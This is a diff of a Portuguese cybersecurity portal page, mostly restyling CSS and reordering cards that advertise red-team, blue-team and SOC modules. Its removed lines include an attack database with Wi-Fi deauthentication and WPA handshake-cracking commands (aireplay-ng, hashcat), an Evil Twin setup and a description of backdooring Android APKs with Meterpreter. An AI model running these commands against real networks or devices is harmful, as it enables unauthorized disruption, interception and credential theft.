@@ -10,10 +10,9 @@
             --bg-card: rgba(17, 24, 39, 0.85);
             --neon-cyan: #00ffcc;
             --neon-blue: #3b82f6;
-            --neon-red: #ff3b3b;
             --text-main: #f3f4f6;
             --text-muted: #9ca3af;
-            --glow: 0 0 15px rgba(0, 255, 204, 0.3);
+            --glow: 0 0 15px rgba(0, 255, 204, 0.2);
         }
         * {
             margin: 0;
@@ -24,8 +23,8 @@
         body {
             background-color: var(--bg-deep);
             background-image: 
-                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.12) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(0, 255, 204, 0.1) 0px, transparent 50%);
+                radial-gradient(at 0% 0%, rgba(59, 130, 246, 0.1) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(0, 255, 204, 0.08) 0px, transparent 50%);
             color: var(--text-main);
             padding: 20px;
             min-height: 100vh;
@@ -52,80 +51,6 @@
             letter-spacing: 2px;
         }
         
-        /* MONITOR DE IA */
-        .ai-terminal {
-            background: rgba(10, 15, 30, 0.9);
-            border: 1px solid var(--neon-blue);
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 25px;
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.15);
-        }
-        .ai-status {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-family: monospace;
-            font-size: 0.85rem;
-            color: var(--neon-blue);
-            margin-bottom: 10px;
-        }
-        .pulse-dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--neon-blue);
-            border-radius: 50%;
-            animation: pulse 1.5s infinite;
-        }
-        .ai-text {
-            font-family: monospace;
-            font-size: 0.9rem;
-            color: #e5e7eb;
-            border-left: 3px solid var(--neon-cyan);
-            padding-left: 12px;
-            margin: 10px 0;
-        }
-
-        /* BARRA DE PESQUISA AVANÇADA */
-        .search-wrapper {
-            background: rgba(17, 24, 39, 0.9);
-            border: 1px solid rgba(0, 255, 204, 0.4);
-            border-radius: 8px;
-            padding: 6px;
-            display: flex;
-            gap: 10px;
-            margin-bottom: 35px;
-        }
-        .search-box {
-            flex: 1;
-            background: transparent;
-            border: none;
-            padding: 12px 15px;
-            color: var(--text-main);
-            font-size: 1rem;
-            outline: none;
-            font-family: monospace;
-        }
-        .search-btn {
-            background: linear-gradient(135deg, var(--neon-blue), #1d4ed8);
-            color: white;
-            border: none;
-            padding: 0 22px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-transform: uppercase;
-            font-size: 0.85rem;
-            letter-spacing: 1px;
-        }
-        .search-btn:hover {
-            box-shadow: 0 0 10px var(--neon-blue);
-            transform: scale(1.02);
-        }
-        
-        /* SISTEMA DE CARDS DA ENGINE */
         .section-title {
             font-size: 1.1rem;
             text-transform: uppercase;
@@ -134,11 +59,13 @@
             margin-bottom: 20px;
             border-left: 4px solid var(--neon-cyan);
             padding-left: 10px;
+            margin-top: 20px;
         }
         .grid-layout {
             display: grid;
             grid-template-columns: 1fr;
             gap: 20px;
+            margin-bottom: 35px;
         }
         .card-link {
             text-decoration: none;
@@ -156,6 +83,7 @@
         .card:hover {
             border-color: var(--neon-cyan);
             box-shadow: var(--glow);
+            transform: translateY(-2px);
         }
         .card-meta {
             font-family: monospace;
@@ -203,9 +131,80 @@
             border-radius: 4px;
         }
 
+        /* MONITOR DE IA */
+        .ai-terminal {
+            background: rgba(10, 15, 30, 0.85);
+            border: 1px solid var(--neon-blue);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 25px;
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.15);
+        }
+        .ai-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: monospace;
+            font-size: 0.85rem;
+            color: var(--neon-blue);
+            margin-bottom: 10px;
+        }
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--neon-blue);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        .ai-text {
+            font-family: monospace;
+            font-size: 0.9rem;
+            color: #e5e7eb;
+            border-left: 3px solid var(--neon-cyan);
+            padding-left: 12px;
+            margin: 10px 0;
+        }
+
+        /* BARRA DE PESQUISA */
+        .search-wrapper {
+            background: rgba(17, 24, 39, 0.9);
+            border: 1px solid rgba(0, 255, 204, 0.4);
+            border-radius: 8px;
+            padding: 6px;
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .search-box {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 12px 15px;
+            color: var(--text-main);
+            font-size: 1rem;
+            outline: none;
+            font-family: monospace;
+        }
+        .search-btn {
+            background: linear-gradient(135deg, var(--neon-blue), #1d4ed8);
+            color: white;
+            border: none;
+            padding: 0 22px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+        }
+        .search-btn:hover {
+            box-shadow: 0 0 10px var(--neon-blue);
+        }
+
         @keyframes pulse {
             0% { transform: scale(0.9); opacity: 0.5; }
-            50% { transform: scale(1.1); opacity: 1; box-shadow: 0 0 8px var(--neon-blue); }
+            50% { transform: scale(1.1); opacity: 1; }
             100% { transform: scale(0.9); opacity: 0.5; }
         }
     </style>
@@ -218,52 +217,66 @@
     </header>
 
     <main>
-        <!-- MONITOR DE IA -->
+        <!-- SEÇÃO 1: DIRETÓRIOS PRINCIPAIS DO SITE (SEMPRE VISÍVEIS) -->
+        <h2 class="section-title">Diretórios do Sistema</h2>
+        <div class="grid-layout">
+            
+            <a href="offensive.html" class="card-link">
+                <div class="card">
+                    <div class="card-meta">DB_MODULE_01 // HIGH_THREAT</div>
+                    <h3>01. Red Team & Invasão Ofensiva →</h3>
+                    <p>Acesse o cronograma completo de testes de intrusão, táticas ofensivas baseadas em Cyber Kill Chain, exploits de kernel e técnicas avançadas de evasão de antivírus corporativos.</p>
+                    <div class="tags-container"><span class="tag">PENTEST</span><span class="tag">EXPLOITS</span></div>
+                </div>
+            </a>
+
+            <a href="defensive.html" class="card-link">
+                <div class="card">
+                    <div class="card-meta">DB_MODULE_02 // COMPLIANCE</div>
+                    <h3>02. Blue Team & Defesa Avançada →</h3>
+                    <p>Explore guias de Inteligência de Fontes Abertas (OSINT), análise profunda de binários maliciosos, engenharia reversa de malwares e infraestruturas de rede baseadas em Zero Trust.</p>
+                    <div class="tags-container"><span class="tag">OSINT</span><span class="tag">ZERO_TRUST</span></div>
+                </div>
+            </a>
+
+            <a href="soc_automation.html" class="card-link">
+                <div class="card">
+                    <div class="card-meta">DB_MODULE_03 // SOAR_ENGINE</div>
+                    <h3>03. SOC, Automation & SOAR →</h3>
+                    <p>Monitore playbooks operacionais de resposta rápida a incidentes cibernéticos graves, scripts automatizados em Python para triagem de logs e correlação de eventos em ambientes SIEM.</p>
+                    <div class="tags-container"><span class="tag">PYTHON</span><span class="tag">AUTOMATION</span></div>
+                </div>
+            </a>
+
+        </div>
+
+        <!-- SEÇÃO 2: MONITOR DE INTELIGÊNCIA ARTIFICIAL -->
         <section class="ai-terminal">
             <div class="ai-status">
                 <div class="pulse-dot"></div>
                 <span>NÚCLEO COGNITIVO IA OPERACIONAL ATIVO</span>
             </div>
             <div class="ai-text" id="ai-response">
-                Engine de Busca Avançada online. Prontidão total para indexar vulnerabilidades globais.
+                Engine de Inteligência online. Prontidão total para indexar e processar requisições técnicas de segurança.
             </div>
         </section>
 
-        <!-- NOVO FLUXO COM BOTÃO DE PESQUISA ATIVO -->
+        <!-- SEÇÃO 3: MOTOR DE BUSCA GLOBAL -->
+        <h2 class="section-title">Central de Pesquisa de Vulnerabilidades</h2>
         <div class="search-wrapper">
-            <input type="text" id="cyber-search" class="search-box" placeholder="Digite termos como: wifi, wpa3, deauth, celular, android, malware, exploit, windows, kali...">
-            <button class="search-btn" onclick="executeAdvancedSearch()">Executar Busca</button>
+            <input type="text" id="cyber-search" class="search-box" placeholder="Busque por termos: wifi, celular, pc, windows, android, brute, deauth...">
+            <button class="search-btn" onclick="executeAdvancedSearch()">Pesquisar</button>
         </div>
 
-        <!-- RESULTADOS DO SUPER BANCO DE DADOS -->
-        <h2 class="section-title" id="grid-title">Diretórios Estratégicos</h2>
+        <!-- RESULTADOS DA BUSCA (ENCICLOPÉDIA TÁTICA) -->
+        <h2 class="section-title" id="grid-title">Resultados da Consulta</h2>
         <div class="grid-layout" id="modules-grid">
-            <!-- Os resultados serão injetados e controlados dinamicamente aqui pela Data Engine -->
+            <!-- Injeção de dados via Engine -->
         </div>
     </main>
 
-    <!-- BANCO DE DADOS INTEGRADO + MOTOR JAVASCRIPT -->
     <script>
-        // MASSIVE CYBER SECURITY KNOWLEDGE DATABASE
+        // BANCO DE DADOS INTEGRADO (FIXO E EXPANSÍVEL)
         const cyberDatabase = [
             {
-                id: "wifi_01",
-                meta: "WIFI // WIRELESS_ATTACK",
-                title: "Ataque Deauthentication (Deauth) & Força Bruta WPA2/WPA3",
-                desc: "Metodologia para derrubar dispositivos de redes sem fio de forma remota sem estar conectado a elas, capturando o handshake de autenticação para quebra criptográfica offline via dicionários de senhas robustos.",
-                code: "sudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon\nsudo aireplay-ng --deauth 100 -a [BSSID_ROUTER] -c [MAC_ALVO] wlan0mon\nsudo hashcat -m 22000 handshake.hc22000 wordlist.txt",
-                tags: ["WIFI", "KALI_LINUX", "AIRCRACK", "DEAUTH"]
-            },
-            {
-                id: "wifi_02",
-                meta: "WIFI // ROGUE_AP",
-                title: "Ataque de Gêmeo Maligno (Evil Twin AP)",
-                desc: "Criação de um ponto de acesso falso idêntico ao roteador legítimo do alvo utilizando ferramentas como Hostapd e Dnsmasq. Força o dispositivo a se conectar no sinal hacker para capturar tráfego HTTP e senhas em portais cativos clonados.",
-                code: "airgeddon / wifiphisher --evil-twin\n# Configuração manual de interface:\nifconfig wlan0 192.168.1.1 netmask 255.255.255.0\nroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1",
-                tags: ["WIFI", "EVIL_TWIN", "PHISHING", "MITM"]
-            },
-            {
-                id: "cell_01",
-                meta: "MOBILE // ANDROID_EXPLOIT",
-                title: "Engenharia Reversa e Criação de Payloads Android (APK Backdoor)",
-                desc: "Injeção de agentes maliciosos de controle remoto (Meterpreter) dentro de arquivos APK legítimos de jogos ou utilitários para ignorar detecções básicas do Google Play Protect e obter acesso total ao armazenamento, câmera e SMS.",
+                title: "Ataque Deauthentication (Deauth) & Força Bruta",
